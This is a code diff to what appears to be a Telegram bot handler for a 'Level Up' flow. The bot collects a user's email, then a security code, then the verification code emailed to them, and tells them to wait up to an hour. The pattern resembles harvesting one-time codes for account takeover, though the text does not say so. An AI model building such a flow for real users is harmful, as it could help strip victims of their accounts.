@@ -526,6 +526,7 @@ export default async function handler(req, res) {
     // ==========================================
 
     if (levelUpSessions[chatId]) {
+
       const session = levelUpSessions[chatId];
 
       // ------------------------------------------
@@ -533,12 +534,14 @@ export default async function handler(req, res) {
       // ------------------------------------------
 
       if (session.step === "email") {
+
         const email = text.trim();
 
         const emailRegex =
           /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
         if (!emailRegex.test(email)) {
+
           await bot.sendMessage(
             chatId,
             "❌ Please send a valid email address."
@@ -560,7 +563,7 @@ export default async function handler(req, res) {
 
         await bot.sendMessage(
           chatId,
-          "🔐 Please send your security code."
+          `🔐 Please send your security code.`
         );
 
         return res.status(200).json({
@@ -568,29 +571,35 @@ export default async function handler(req, res) {
         });
       }
 
+
       // ------------------------------------------
-      // STEP 2: NEXT MESSAGE
+      // STEP 2: VERIFICATION
       // ------------------------------------------
 
       if (session.step === "verification") {
 
-        console.log("VERIFICATION RESPONSE RECEIVED");
+        console.log("VERIFICATION STEP");
+
+        levelUpSessions[chatId] = {
+          ...session,
+          step: "levelup_pending",
+          startedAt: Date.now(),
+        };
 
         await bot.sendMessage(
           chatId,
           `✅ Verification code have been sent to your email.
 
-Please check and send that verification code. After completing it,
+Please send that verification code.
 
-⏳ Please wait for 60 minutes.`
+⏳ After completing the verification, please wait up to 60 minutes for your request to be processed.`
         );
-
-        delete levelUpSessions[chatId];
 
         return res.status(200).json({
           success: true,
         });
       }
+
 
       // ------------------------------------------
       // STEP 3: LEVEL UP UNDER PROGRESS
@@ -603,13 +612,12 @@ Please check and send that verification code. After completing it,
         await bot.sendMessage(
           chatId,
           `⏳ Your Level Up request is currently under progress.
-      
-      ✅ Your verification process has been completed.
-      🔄 We are processing your Level Up request.
-      
-      Please wait a little longer. You will be notified once the process is completed.
-      
-      🙏 Thank you for your patience.`
+
+🔄 Your request is being processed.
+
+Please wait a little longer. You will be notified once the process is completed.
+
+🙏 Thank you for your patience.`
         );
 
         return res.status(200).json({
